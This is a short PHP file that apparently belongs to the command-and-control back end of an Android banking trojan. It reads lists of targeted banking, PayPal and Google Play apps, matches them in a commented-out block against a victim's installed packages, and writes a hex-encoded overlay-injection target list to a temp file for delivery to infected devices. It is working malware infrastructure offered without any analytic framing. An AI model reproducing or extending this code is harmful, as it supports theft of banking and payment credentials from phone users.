<?

//echo substr(base64_encode(md5(time())), 0, 25);

/*$json = '["com.lge.qremote","ru.mw","com.android.providers.downloads.ui","com.android.calculator2","com.lge.sizechangable.favoritecontacts","com.ksmobile.cb","com.lge.qmemoplus","com.lge.lgworld","com.lge.appwidget.flashlight","com.finansbank.mobile.cepsube","com.box.android","yyyyyyyy.xxxxxxxxxx.application230116","com.dropbox.android","com.ghisler.android.TotalCommander","com.aide.premium.key","com.tozalakyan.viewsource","com.whatsapp","com.lge.task","com.lge.fmradio","com.eset.ems2.gp","com.lge.thinkfreeviewer","com.ideashower.readitlater.pro"]';

$array = json_decode($json, true);

print_r($array);

echo "<br>\r\n";

$paypal = trim(file_get_contents("injectlist/paypal.txt"));

$paypalarr = explode("^", $paypal);

print_r($paypalarr);

echo "<br>\r\n";

$result = "";

foreach($paypalarr as $pp) {
	if(in_array($pp, $array)) {
		$result .= $pp."^";
	}
}

if($result != "") {
	$result = substr_replace($result, "|", -1);
}

$banks = trim(file_get_contents("injectlist/banks.txt"));

$banksarr = explode("^", $banks);

foreach($banksarr as $pp) {
	if(in_array($pp, $array)) {
		$result .= $pp."^";
	}
}

if($result != "") {
	$result = substr_replace($result, "|", -1);
}

$result .= file_get_contents("injectlist/playgoogle.txt");

echo $result;*/

	$result = trim(file_get_contents("injectlist/banks.txt"))."|".trim(file_get_contents("injectlist/paypal.txt"))."|".trim(file_get_contents("injectlist/playgoogle.txt"));
	file_put_contents("temp/inject".$uniqid, bin2hex($result));
	exit(0);
	
	
